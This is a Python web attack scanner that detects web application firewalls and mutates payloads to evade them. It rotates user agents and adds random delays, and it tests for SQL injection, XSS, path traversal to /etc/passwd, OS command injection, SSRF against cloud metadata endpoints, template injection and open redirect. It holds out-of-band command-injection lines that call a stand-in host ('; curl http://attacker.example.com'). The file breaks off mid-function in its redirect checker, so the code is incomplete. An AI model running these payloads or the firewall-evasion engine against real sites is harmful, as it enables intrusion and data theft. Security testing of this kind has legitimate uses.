#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Production-Grade Vulnerability Scanner
=======================================

A standalone scanner that:
1. Detects and bypasses WAFs before testing.
2. Tests for SQLi, XSS, LFI/Path Traversal, and Command Injection.
3. Avoids false positives with rigorous verification logic.
"""

import logging
import random
import re
import time
import urllib.parse

import requests

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

_DEFAULT_TIMEOUT = 15

_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) "
    "Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) "
    "Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 "
    "Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
]

# WAF block status codes
_WAF_BLOCK_CODES = frozenset({403, 406, 429, 503, 999})


# ═══════════════════════════════════════════════════════════════════════════
# Data-classes for scan results
# ═══════════════════════════════════════════════════════════════════════════


class ScanFinding:
    """Represents a single vulnerability finding."""

    __slots__ = (
        "vuln_class", "url", "param", "payload", "evidence",
        "severity", "confidence", "status",
    )

    def __init__(
        self,
        vuln_class: str,
        url: str,
        param: str = "",
        payload: str = "",
        evidence: str = "",
        severity: str = "INFO",
        confidence: float = 0.0,
        status: str = "confirmed",
    ):
        self.vuln_class = vuln_class
        self.url = url
        self.param = param
        self.payload = payload
        self.evidence = evidence
        self.severity = severity
        self.confidence = confidence
        self.status = status

    def to_dict(self) -> dict:
        return {
            "vuln_class": self.vuln_class,
            "url": self.url,
            "param": self.param,
            "payload": self.payload,
            "evidence": self.evidence,
            "severity": self.severity,
            "confidence": self.confidence,
            "status": self.status,
        }

    def __repr__(self) -> str:
        return (
            f"ScanFinding(vuln_class={self.vuln_class!r}, url={self.url!r}, "
            f"param={self.param!r}, severity={self.severity!r}, "
            f"confidence={self.confidence}, status={self.status!r})"
        )


# ═══════════════════════════════════════════════════════════════════════════
# Phase 1: WAF Detection & Fingerprinting
# ═══════════════════════════════════════════════════════════════════════════


# WAF signature database — header keys, cookie names, body patterns
_WAF_SIGNATURES: dict[str, list[str]] = {
    "Cloudflare": [
        "cf-ray", "cloudflare", "__cfduid", "cf_clearance",
        "cf-cache-status", "cf-request-id",
    ],
    "AWS WAF": [
        "awselb", "aws-waf", "x-amzn-requestid",
        "x-amzn-errortype", "x-amz-cf-id", "awsalb",
    ],
    "ModSecurity": [
        "mod_security", "modsecurity", "noyb",
    ],
    "Sucuri": [
        "sucuri", "x-sucuri", "sucuri_cloudproxy", "sucuri-cache",
    ],
    "Incapsula": [
        "incap_ses", "visid_incap", "incapsula", "x-iinfo",
    ],
    "Akamai": [
        "akamai", "ak_bmsc", "x-akamai-transformed",
    ],
    "F5 BIG-IP": [
        "bigip", "f5", "x-waf-status", "bigipserver",
    ],
    "Imperva": [
        "imperva",
    ],
    "Barracuda": [
        "barra", "barracuda",
    ],
    "Fortinet": [
        "fortigate", "fortiwaf",
    ],
}

# Block-page content indicators
_BLOCK_PAGE_INDICATORS = [
    "access denied",
    "your request has been blocked",
    "blocked by",
    "request rejected",
    "not acceptable",
    "web application firewall",
    "firewall",
]

# Probe payloads that commonly trigger WAFs
_WAF_PROBE_PAYLOADS = [
    "' OR 1=1",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
]


class WAFDetector:
    """Phase 1: Detect and fingerprint WAFs."""

    def __init__(self, session: requests.Session, timeout: int = _DEFAULT_TIMEOUT):
        self._session = session
        self._timeout = timeout

    def detect(self, url: str) -> list[str]:
        """Detect WAFs protecting *url*.

        Returns a list of detected WAF names (empty if none found).
        """
        detected: list[str] = []

        # ── Passive check: headers, cookies, body of a benign GET ──
        try:
            resp = self._session.get(url, timeout=self._timeout, allow_redirects=True)
            if resp is not None:
                detected.extend(self._match_signatures(resp))
        except requests.RequestException:
            pass

        # ── Active probing: send attack signatures and look for blocks ──
        for probe in _WAF_PROBE_PAYLOADS:
            try:
                probe_url = self._build_probe_url(url, probe)
                resp = self._session.get(
                    probe_url, timeout=self._timeout, allow_redirects=True,
                )
                if resp is None:
                    continue
                if self._is_blocked(resp):
                    if "Generic WAF" not in detected:
                        detected.append("Generic WAF")
                # Also re-check signatures on the block response
                for waf in self._match_signatures(resp):
                    if waf not in detected:
                        detected.append(waf)
            except requests.RequestException:
                continue

        return detected

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _match_signatures(resp: requests.Response) -> list[str]:
        """Match response against known WAF signatures."""
        found: list[str] = []
        headers_str = " ".join(
            f"{k}: {v}" for k, v in resp.headers.items()
        ).lower()
        cookies_str = " ".join(
            f"{c.name}={c.value}" for c in resp.cookies
        ).lower()
        body = (resp.text or "")[:4000].lower()
        combined = f"{headers_str} {cookies_str} {body}"

        for waf_name, sigs in _WAF_SIGNATURES.items():
            for sig in sigs:
                if sig.lower() in combined:
                    if waf_name not in found:
                        found.append(waf_name)
                    break
        return found

    @staticmethod
    def _is_blocked(resp: requests.Response) -> bool:
        """Heuristic: does this response look like a WAF block?"""
        if resp.status_code in _WAF_BLOCK_CODES:
            return True
        body = (resp.text or "")[:4000].lower()
        return any(indicator in body for indicator in _BLOCK_PAGE_INDICATORS)

    @staticmethod
    def _build_probe_url(url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        probe_qs = urllib.parse.urlencode({"test": payload})
        return urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, probe_qs, parsed.fragment,
        ))


# ═══════════════════════════════════════════════════════════════════════════
# Phase 2: WAF Bypass / Evasion Engine
# ═══════════════════════════════════════════════════════════════════════════


class WAFBypassEngine:
    """Generate mutated payload variants to evade WAF rules.

    Techniques applied (in order of aggressiveness):
    1. Case variation
    2. Single URL encoding
    3. Double URL encoding
    4. Triple URL encoding
    5. SQL-comment insertion
    6. Whitespace alternatives
    7. Null-byte injection
    8. HTML entity encoding
    9. Integer/string obfuscation
    """

    WHITESPACE_ALTS = ["%09", "%0a", "%0d", "%0b"]

    def generate_variants(self, payload: str) -> list[str]:
        """Return a list of evasion variants (original first)."""
        variants: list[str] = [payload]

        # 1. Case variation
        variants.append(self._case_variation(payload))

        # 2. Single URL encoding
        variants.append(urllib.parse.quote(payload, safe=""))

        # 3. Double URL encoding
        variants.append(
            urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        )

        # 4. Triple URL encoding
        variants.append(
            urllib.parse.quote(
                urllib.parse.quote(
                    urllib.parse.quote(payload, safe=""), safe=""
                ), safe=""
            )
        )

        # 5. Comment insertion (SQL-style)
        variants.append(self._comment_insert(payload))

        # 6. Whitespace alternatives
        for ws in self.WHITESPACE_ALTS:
            variants.append(payload.replace(" ", ws))

        # 7. Null-byte injection
        variants.append(f"%00{payload}")

        # 8. HTML entity encoding
        variants.append(self._html_entity(payload))

        # 9. String obfuscation
        variants.append(self._string_obfuscate(payload))

        # De-duplicate while preserving order
        seen: set[str] = set()
        unique: list[str] = []
        for v in variants:
            if v not in seen:
                seen.add(v)
                unique.append(v)
        return unique

    # ------------------------------------------------------------------
    @staticmethod
    def _case_variation(payload: str) -> str:
        return "".join(
            c.upper() if i % 2 == 0 else c.lower()
            for i, c in enumerate(payload)
        )

    @staticmethod
    def _comment_insert(payload: str) -> str:
        return payload.replace(" ", "/**/")

    @staticmethod
    def _html_entity(payload: str) -> str:
        return "".join(
            f"&#{ord(c)};" if not c.isalnum() else c for c in payload
        )

    @staticmethod
    def _string_obfuscate(payload: str) -> str:
        return payload.replace("'a'='a'", "'a'||'a'").replace(
            "alert(1)", "alert(+1+)"
        )


# ═══════════════════════════════════════════════════════════════════════════
# Phase 3: Vulnerability Testers
# ═══════════════════════════════════════════════════════════════════════════


class _BaseTester:
    """Shared utilities for all vulnerability testers."""

    def __init__(
        self,
        session: requests.Session,
        bypass_engine: WAFBypassEngine | None,
        waf_detected: bool,
        timeout: int = _DEFAULT_TIMEOUT,
        delay_range: tuple[float, float] = (0.5, 2.0),
    ):
        self._session = session
        self._bypass = bypass_engine
        self._waf_detected = waf_detected
        self._timeout = timeout
        self._delay_range = delay_range

    def _get_payloads(self, raw_payloads: list[str]) -> list[str]:
        """If WAF detected, expand payloads with bypass variants."""
        if not self._waf_detected or self._bypass is None:
            return list(raw_payloads)
        expanded: list[str] = []
        for p in raw_payloads:
            expanded.extend(self._bypass.generate_variants(p))
        # De-duplicate
        seen: set[str] = set()
        result: list[str] = []
        for p in expanded:
            if p not in seen:
                seen.add(p)
                result.append(p)
        return result

    def _send(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
    ) -> requests.Response | None:
        """Send a single request with evasion delay and random UA."""
        time.sleep(random.uniform(*self._delay_range))
        self._session.headers["User-Agent"] = random.choice(_USER_AGENTS)
        try:
            if method.upper() == "GET":
                return self._session.get(
                    url, params={param: payload},
                    timeout=self._timeout, allow_redirects=True,
                )
            return self._session.post(
                url, data={param: payload},
                timeout=self._timeout, allow_redirects=True,
            )
        except requests.RequestException:
            return None

    def _baseline(
        self, url: str, method: str, param: str, value: str,
    ) -> tuple[str, int, int]:
        """Get baseline response (text, status, length)."""
        resp = self._send(url, method, param, value)
        if resp is None:
            return "", 0, 0
        return resp.text, resp.status_code, len(resp.text)


# ── 3.1 SQL Injection (Boolean-based Blind) ──────────────────────────


class SQLiTester(_BaseTester):
    """Detect SQL injection via boolean-blind with time-based fallback.

    Uses rigorous verification to avoid false positives:
    - 5x consistency rounds (true and false payloads)
    - 25% minimum difference threshold between true/false
    - TRUE response must be within 15% of baseline (same page)
    - Time-based fallback requires baseline timing comparison
    """

    _TRUE_PAYLOADS = ["' AND 1=1 --", "' AND 'a'='a' --"]
    _FALSE_PAYLOADS = ["' AND 1=2 --", "' AND 'a'='b' --"]
    _TIME_PAYLOADS = [
        "' OR SLEEP(5) --",
        "' OR pg_sleep(5) --",
        "' OR WAITFOR DELAY '0:0:5' --",
    ]

    # Minimum percentage difference between true and false responses
    _LENGTH_DIFF_THRESHOLD = 0.25  # 25%

    # Maximum allowed deviation of TRUE response from baseline
    _BASELINE_PROXIMITY_THRESHOLD = 0.15  # 15%

    # Number of consistency rounds
    _CONSISTENCY_ROUNDS = 5

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        baseline_text, baseline_status, baseline_len = self._baseline(
            url, method, param, value,
        )
        if baseline_status == 0:
            return findings

        true_payloads = self._get_payloads(self._TRUE_PAYLOADS)
        false_payloads = self._get_payloads(self._FALSE_PAYLOADS)

        for tp, fp in zip(true_payloads, false_payloads):
            result = self._boolean_test(
                url, method, param, value, tp, fp,
                baseline_text, baseline_len,
            )
            if result is not None:
                findings.append(result)
                return findings  # one confirmed finding is enough

        return findings

    def _boolean_test(
        self,
        url: str,
        method: str,
        param: str,
        value: str,
        true_payload: str,
        false_payload: str,
        baseline_text: str,
        baseline_len: int,
    ) -> ScanFinding | None:
        """Run boolean-blind verification with Nx consistency check."""
        true_lengths: list[int] = []
        false_lengths: list[int] = []

        for _ in range(self._CONSISTENCY_ROUNDS):
            tr = self._send(url, method, param, f"{value}{true_payload}")
            fr = self._send(url, method, param, f"{value}{false_payload}")
            if tr is None or fr is None:
                return None
            true_lengths.append(len(tr.text))
            false_lengths.append(len(fr.text))

        # Check consistency: all true responses should have similar length
        if not self._lengths_consistent(true_lengths):
            return None
        if not self._lengths_consistent(false_lengths):
            return None

        n = self._CONSISTENCY_ROUNDS
        avg_true = sum(true_lengths) / n
        avg_false = sum(false_lengths) / n

        # Must have a noticeable difference between true and false
        diff = abs(avg_true - avg_false)
        max_len = max(avg_true, avg_false, 1)
        pct_diff = diff / max_len

        if pct_diff <= self._LENGTH_DIFF_THRESHOLD:
            # Ambiguous — fall back to time-based
            return self._time_based_fallback(url, method, param, value)

        # TRUE response must be close to baseline (same page content)
        if baseline_len > 0:
            baseline_deviation = abs(avg_true - baseline_len) / baseline_len
            if baseline_deviation > self._BASELINE_PROXIMITY_THRESHOLD:
                # TRUE response is also very different from baseline —
                # likely the app just shows different error pages, not SQLi
                return self._time_based_fallback(url, method, param, value)

        return ScanFinding(
            vuln_class="SQL Injection (Boolean-Blind)",
            url=url,
            param=param,
            payload=true_payload,
            evidence=(
                f"Consistent {n}x difference: true avg={avg_true:.0f}, "
                f"false avg={avg_false:.0f} ({pct_diff:.1%} diff, "
                f"baseline={baseline_len})"
            ),
            severity="HIGH",
            confidence=0.9,
            status="confirmed",
        )

    def _time_based_fallback(
        self, url: str, method: str, param: str, value: str,
    ) -> ScanFinding | None:
        """Confirm SQLi via time-based payloads with baseline comparison."""
        time_payloads = self._get_payloads(self._TIME_PAYLOADS)

        # Measure baseline timing
        baseline_times: list[float] = []
        for _ in range(2):
            start = time.time()
            self._send(url, method, param, value)
            baseline_times.append(time.time() - start)
        avg_baseline = sum(baseline_times) / max(len(baseline_times), 1)

        for payload in time_payloads:
            delays: list[float] = []
            for _ in range(3):
                start = time.time()
                self._send(url, method, param, f"{value}{payload}")
                elapsed = time.time() - start
                delays.append(elapsed)

            # All 3 must show > 3s increase over baseline
            if all(d - avg_baseline > 3.0 for d in delays):
                return ScanFinding(
                    vuln_class="SQL Injection (Time-Based Blind)",
                    url=url,
                    param=param,
                    payload=payload,
                    evidence=(
                        f"Consistent delay: {[f'{d:.2f}s' for d in delays]} "
                        f"(baseline: {avg_baseline:.2f}s)"
                    ),
                    severity="HIGH",
                    confidence=0.85,
                    status="confirmed",
                )
        return None

    @staticmethod
    def _lengths_consistent(
        lengths: list[int], tolerance_pct: float = 0.08,
    ) -> bool:
        """Check if all lengths are within *tolerance_pct* of each other."""
        if not lengths:
            return False
        avg = sum(lengths) / len(lengths)
        if avg == 0:
            return all(length == 0 for length in lengths)
        return all(abs(length - avg) / avg <= tolerance_pct for length in lengths)


# ── 3.2 Cross-Site Scripting (Reflected) ─────────────────────────────


class XSSTester(_BaseTester):
    """Detect reflected XSS with context-aware verification."""

    _PAYLOADS = [
        "<script>alert('XSS')</script>",
        '<img src=x onerror=alert(1)>',
        "javascript:alert(1)",
    ]

    @staticmethod
    def _generate_token() -> str:
        """Generate a unique random token for XSS reflection testing.

        Returns a string in the format ``XSS_TEST_<hex>`` using
        :func:`secrets.token_hex` for cryptographic randomness so that
        WAFs cannot predict and filter the marker.
        """
        import secrets
        return f"XSS_TEST_{secrets.token_hex(6)}"

    # Patterns that indicate the payload is inside a safe (non-exec) context
    _SAFE_CONTEXTS = [
        re.compile(r"<!--.*?-->", re.DOTALL),  # HTML comment
        re.compile(r"<!\[CDATA\[.*?\]\]>", re.DOTALL),  # CDATA
    ]

    # Sanitisation markers — if present the payload was escaped
    _SANITISED_MARKERS = [
        "&lt;", "&gt;", "&quot;", "&#x3c;", "&#x3e;",
        "\\x3c", "\\x3e", "\\u003c", "\\u003e",
    ]

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        # ── Token reflection check ──
        token_finding = self._token_check(url, method, param)
        if token_finding:
            findings.append(token_finding)

        # ── Payload reflection check ──
        payloads = self._get_payloads(self._PAYLOADS)
        for payload in payloads:
            resp = self._send(url, method, param, payload)
            if resp is None:
                continue
            body = resp.text
            if payload not in body:
                continue

            # Check sanitisation
            if self._is_sanitised(payload, body):
                continue

            # Check if inside a safe context (comment, CDATA)
            if self._in_safe_context(payload, body):
                continue

            # Determine execution context
            context = self._detect_context(payload, body)

            findings.append(ScanFinding(
                vuln_class="XSS (Reflected)",
                url=url,
                param=param,
                payload=payload,
                evidence=f"Payload reflected unescaped{context}",
                severity="HIGH",
                confidence=0.9 if context else 0.85,
                status="confirmed",
            ))
            break  # one confirmed finding is sufficient

        return findings

    def _token_check(
        self, url: str, method: str, param: str,
    ) -> ScanFinding | None:
        """Inject a unique token and verify it appears unsanitised."""
        token = self._generate_token()
        resp = self._send(url, method, param, token)
        if resp is None:
            return None
        if token in resp.text:
            # Token reflected — now wrap it in a script tag
            attack = f"<script>{token}</script>"
            resp2 = self._send(url, method, param, attack)
            if resp2 and attack in resp2.text:
                if not self._is_sanitised(attack, resp2.text):
                    return ScanFinding(
                        vuln_class="XSS (Reflected)",
                        url=url,
                        param=param,
                        payload=attack,
                        evidence=(
                            f"Unique token {token!r} reflected "
                            "inside <script> tag without sanitisation"
                        ),
                        severity="HIGH",
                        confidence=0.95,
                        status="confirmed",
                    )
        return None

    @classmethod
    def _is_sanitised(cls, payload: str, body: str) -> bool:
        for marker in cls._SANITISED_MARKERS:
            if marker in body.lower():
                return True
        if "<script>" in payload.lower() and "<script>" not in body.lower():
            return True
        return False

    @classmethod
    def _in_safe_context(cls, payload: str, body: str) -> bool:
        for pattern in cls._SAFE_CONTEXTS:
            for match in pattern.finditer(body):
                if payload in match.group():
                    return True
        return False

    @staticmethod
    def _detect_context(payload: str, body: str) -> str:
        escaped = re.escape(payload)
        if re.search(
            r"<script[^>]*>.*?" + escaped, body, re.DOTALL | re.IGNORECASE,
        ):
            return " (inside <script> tag)"
        if re.search(r'=[\'"]' + escaped, body):
            return " (inside HTML attribute)"
        return ""


# ── 3.3 LFI / Path Traversal ────────────────────────────────────────


class LFITester(_BaseTester):
    """Detect Local File Inclusion and path traversal."""

    _UNIX_PAYLOADS = [
        "../../../../etc/passwd",
        "....//....//....//....//etc/passwd",
        "..%252f..%252f..%252f..%252fetc/passwd",
    ]

    _WINDOWS_PAYLOADS = [
        "..\\..\\..\\..\\windows\\win.ini",
        "....\\....\\....\\....\\windows\\win.ini",
    ]

    _UNIX_INDICATORS = ["root:x:", "bin/bash", "bin/sh", "daemon:x:"]
    _WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "for 16-bit app support"]

    # Error page patterns to filter out false positives
    _ERROR_PATTERNS = [
        "file not found",
        "access denied",
        "no such file",
        "permission denied",
        "cannot find",
        "404 not found",
    ]

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        baseline_text, _, _ = self._baseline(url, method, param, value)

        # Unix LFI
        unix_payloads = self._get_payloads(self._UNIX_PAYLOADS)
        for payload in unix_payloads:
            f = self._check_lfi(
                url, method, param, payload, baseline_text,
                self._UNIX_INDICATORS, "LFI / Path Traversal (Unix)",
            )
            if f:
                findings.append(f)
                break

        # Windows LFI
        win_payloads = self._get_payloads(self._WINDOWS_PAYLOADS)
        for payload in win_payloads:
            f = self._check_lfi(
                url, method, param, payload, baseline_text,
                self._WINDOWS_INDICATORS, "LFI / Path Traversal (Windows)",
            )
            if f:
                findings.append(f)
                break

        return findings

    def _check_lfi(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        baseline_text: str,
        indicators: list[str],
        vuln_class: str,
    ) -> ScanFinding | None:
        resp = self._send(url, method, param, payload)
        if resp is None:
            return None
        body = resp.text

        # Check for error page — skip if this is just an error
        if self._is_error_page(body):
            return None

        # Count NEW indicators (not present in baseline)
        new_matches = sum(
            1 for ind in indicators
            if ind in body and ind not in baseline_text
        )
        if new_matches >= 2:
            return ScanFinding(
                vuln_class=vuln_class,
                url=url,
                param=param,
                payload=payload,
                evidence=f"{new_matches} file-content indicators found",
                severity="HIGH",
                confidence=0.9,
                status="confirmed",
            )
        return None

    @classmethod
    def _is_error_page(cls, body: str) -> bool:
        body_lower = body.lower()
        return any(pat in body_lower for pat in cls._ERROR_PATTERNS)


# ── 3.4 OS Command Injection ────────────────────────────────────────


class CMDiTester(_BaseTester):
    """Detect OS command injection via time-based and output-based checks."""

    _OUTPUT_PAYLOADS = [
        "; ls", "| dir", "|| whoami", "; id",
    ]

    _TIME_PAYLOADS_UNIX = [
        "; sleep 5", "| sleep 5", "&& sleep 5",
    ]
    _TIME_PAYLOADS_WIN = [
        "| timeout 5",
    ]

    _OOB_PAYLOADS = [
        "; nslookup test.attacker.example.com",
        "; curl http://attacker.example.com",
    ]

    _UNIX_OUTPUT_PATTERNS = [
        re.compile(r"uid=\d+\(\w+\)"),
        re.compile(r"root:x:\d+:\d+:"),
        re.compile(r"-rw-r--r--"),
        re.compile(r"drwx"),
        re.compile(r"/bin/bash"),
    ]

    _WINDOWS_OUTPUT_PATTERNS = [
        re.compile(r"Volume Serial Number", re.IGNORECASE),
        re.compile(r"Directory of", re.IGNORECASE),
        re.compile(r"Program Files", re.IGNORECASE),
    ]

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        baseline_text, _, _ = self._baseline(url, method, param, value)

        # Output-based
        output_finding = self._test_output(
            url, method, param, value, baseline_text,
        )
        if output_finding:
            findings.append(output_finding)
            return findings

        # Time-based (Unix)
        time_finding = self._test_time_based(
            url, method, param, value,
            self._TIME_PAYLOADS_UNIX + self._TIME_PAYLOADS_WIN,
        )
        if time_finding:
            findings.append(time_finding)

        return findings

    def _test_output(
        self,
        url: str,
        method: str,
        param: str,
        value: str,
        baseline_text: str,
    ) -> ScanFinding | None:
        payloads = self._get_payloads(self._OUTPUT_PAYLOADS)
        for payload in payloads:
            resp = self._send(url, method, param, f"{value}{payload}")
            if resp is None:
                continue
            body = resp.text

            # Check for NEW patterns
            for pattern in self._UNIX_OUTPUT_PATTERNS + self._WINDOWS_OUTPUT_PATTERNS:
                if pattern.search(body) and not pattern.search(baseline_text):
                    return ScanFinding(
                        vuln_class="Command Injection",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=f"Command output detected: {pattern.pattern[:50]}",
                        severity="CRITICAL",
                        confidence=0.95,
                        status="confirmed",
                    )
        return None

    def _test_time_based(
        self,
        url: str,
        method: str,
        param: str,
        value: str,
        time_payloads: list[str],
    ) -> ScanFinding | None:
        """Time-based blind — 3x consistency verification."""
        payloads = self._get_payloads(time_payloads)

        # Baseline timing
        baseline_times: list[float] = []
        for _ in range(2):
            start = time.time()
            self._send(url, method, param, value)
            baseline_times.append(time.time() - start)
        avg_baseline = sum(baseline_times) / max(len(baseline_times), 1)

        for payload in payloads:
            delays: list[float] = []
            for _ in range(3):
                start = time.time()
                self._send(url, method, param, f"{value}{payload}")
                elapsed = time.time() - start
                delays.append(elapsed)

            # All 3 must show > 3s increase over baseline
            if all(d - avg_baseline > 3.0 for d in delays):
                return ScanFinding(
                    vuln_class="Command Injection (Blind/Time-Based)",
                    url=url,
                    param=param,
                    payload=payload,
                    evidence=(
                        f"Consistent delay: {[f'{d:.2f}s' for d in delays]} "
                        f"(baseline: {avg_baseline:.2f}s)"
                    ),
                    severity="CRITICAL",
                    confidence=0.85,
                    status="confirmed",
                )
        return None


# ── 3.5 Server-Side Request Forgery (SSRF) ──────────────────────────


class SSRFTester(_BaseTester):
    """Detect SSRF via behavioural response differentials and known indicators."""

    # Payloads that target internal/cloud metadata endpoints
    _PAYLOADS = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://[::1]/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
    ]

    # Indicators that the backend fetched an internal resource
    _INTERNAL_INDICATORS = [
        "ami-id", "instance-id", "local-ipv4", "public-hostname",     # AWS
        "computeMetadata",                                              # GCP
        "root:x:", "/bin/bash",                                         # /etc/passwd
        "127.0.0.1", "localhost",                                       # generic loopback echo
    ]

    # Patterns that indicate a generic error (not a true fetch)
    _ERROR_PATTERNS = [
        "could not connect",
        "connection refused",
        "name or service not known",
        "invalid url",
        "malformed",
    ]

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        baseline_text, baseline_status, baseline_len = self._baseline(
            url, method, param, value,
        )
        if baseline_status == 0:
            return findings

        payloads = self._get_payloads(self._PAYLOADS)
        for payload in payloads:
            resp = self._send(url, method, param, payload)
            if resp is None:
                continue
            body = resp.text

            # Reject if it's just an error page
            if self._is_error_response(body):
                continue

            # Check for internal/metadata indicators NOT in baseline
            new_indicators = [
                ind for ind in self._INTERNAL_INDICATORS
                if ind in body and ind not in baseline_text
            ]

            if len(new_indicators) >= 1:
                # Verify with a second request for consistency
                resp2 = self._send(url, method, param, payload)
                if resp2 is None:
                    continue
                confirmed = [
                    ind for ind in new_indicators
                    if ind in resp2.text
                ]
                if confirmed:
                    findings.append(ScanFinding(
                        vuln_class="SSRF (Server-Side Request Forgery)",
                        url=url,
                        param=param,
                        payload=payload,
                        evidence=(
                            f"Internal resource indicators detected: "
                            f"{confirmed[:3]}"
                        ),
                        severity="HIGH",
                        confidence=0.9,
                        status="confirmed",
                    ))
                    return findings

            # Behavioural differential: significant length/status change
            length_diff = abs(len(body) - baseline_len)
            if baseline_len > 0 and length_diff / baseline_len > 0.5:
                if resp.status_code == 200 and baseline_status == 200:
                    # Verify once more
                    resp2 = self._send(url, method, param, payload)
                    if resp2 and abs(len(resp2.text) - baseline_len) / max(baseline_len, 1) > 0.5:
                        findings.append(ScanFinding(
                            vuln_class="SSRF (Server-Side Request Forgery)",
                            url=url,
                            param=param,
                            payload=payload,
                            evidence=(
                                f"Significant response difference: "
                                f"baseline={baseline_len}, "
                                f"payload={len(body)}"
                            ),
                            severity="MEDIUM",
                            confidence=0.6,
                            status="likely",
                        ))
                        return findings

        return findings

    @classmethod
    def _is_error_response(cls, body: str) -> bool:
        body_lower = body.lower()
        return any(pat in body_lower for pat in cls._ERROR_PATTERNS)


# ── 3.6 Server-Side Template Injection (SSTI) ───────────────────────


class SSTITester(_BaseTester):
    """Detect SSTI by injecting template expressions and checking evaluation."""

    # Pairs of (payload, expected_output) — deterministic math expressions
    _EXPRESSION_TESTS = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("{{7*'7'}}", "7777777"),       # Jinja2-specific
        ("#{7*7}", "49"),               # Ruby ERB / Java EL
    ]

    # Error patterns that indicate template parsing (potential SSTI)
    _TEMPLATE_ERROR_PATTERNS = [
        "templateerror",
        "jinja2.exceptions",
        "mako.exceptions",
        "freemarker.core",
        "velocity",
        "twig",
        "django.template",
        "smarty",
        "pebble",
    ]

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        baseline_text, baseline_status, _ = self._baseline(
            url, method, param, value,
        )
        if baseline_status == 0:
            return findings

        # ── Expression evaluation tests ──
        for payload, expected in self._EXPRESSION_TESTS:
            payloads = self._get_payloads([payload])
            for p in payloads:
                resp = self._send(url, method, param, p)
                if resp is None:
                    continue
                body = resp.text

                if expected in body and expected not in baseline_text:
                    # Verify: send again to confirm deterministic evaluation
                    resp2 = self._send(url, method, param, p)
                    if resp2 and expected in resp2.text:
                        findings.append(ScanFinding(
                            vuln_class="SSTI (Server-Side Template Injection)",
                            url=url,
                            param=param,
                            payload=p,
                            evidence=(
                                f"Expression '{payload}' evaluated to "
                                f"'{expected}' in response"
                            ),
                            severity="CRITICAL",
                            confidence=0.95,
                            status="confirmed",
                        ))
                        return findings

        # ── Template error detection ──
        probe_payloads = self._get_payloads(["{{", "${", "<%"])
        for p in probe_payloads:
            resp = self._send(url, method, param, p)
            if resp is None:
                continue
            body_lower = resp.text.lower()
            for err_pat in self._TEMPLATE_ERROR_PATTERNS:
                if err_pat in body_lower and err_pat not in baseline_text.lower():
                    findings.append(ScanFinding(
                        vuln_class="SSTI (Server-Side Template Injection)",
                        url=url,
                        param=param,
                        payload=p,
                        evidence=f"Template error detected: {err_pat}",
                        severity="HIGH",
                        confidence=0.7,
                        status="likely",
                    ))
                    return findings

        return findings


# ── 3.7 Open Redirect ───────────────────────────────────────────────


class OpenRedirectTester(_BaseTester):
    """Detect open redirect vulnerabilities."""

    # Canary domain used in redirect payloads — must NOT be a real domain
    _CANARY_DOMAIN = "evil.example.com"

    # External domains that should never be redirected to
    _REDIRECT_PAYLOADS = [
        "https://evil.example.com",
        "//evil.example.com",
        "https://evil.example.com/%2f%2e%2e",
        "/\\evil.example.com",
        "https:evil.example.com",
    ]

    def test(
        self, url: str, method: str, param: str, value: str,
    ) -> list[ScanFinding]:
        findings: list[ScanFinding] = []

        payloads = self._get_payloads(self._REDIRECT_PAYLOADS)
        for payload in payloads:
            finding = self._check_redirect(url, method, param, payload)
            if finding:
                findings.append(finding)
                return findings

        return findings

    def _check_redirect(
        self, url: str, method: str, param: str, payload: str,
    ) -> ScanFinding | None:
        """Send request without following redirects to inspect Location header."""
        time.sleep(random.uniform(*self._delay_range))
        self._session.headers["User-Agent"] = random.choice(_USER_AGENTS)
        try:
            if method.upper() == "GET":
                resp = self._session.get(
                    url, params={param: payload},
                    timeout=self._timeout, allow_redirects=False,
                )
            else:
                resp = self._session.post(
                    url, data={param: payload},
                    timeout=self._timeout, allow_redirects=False,
                )
        except requests.RequestException:
            return None

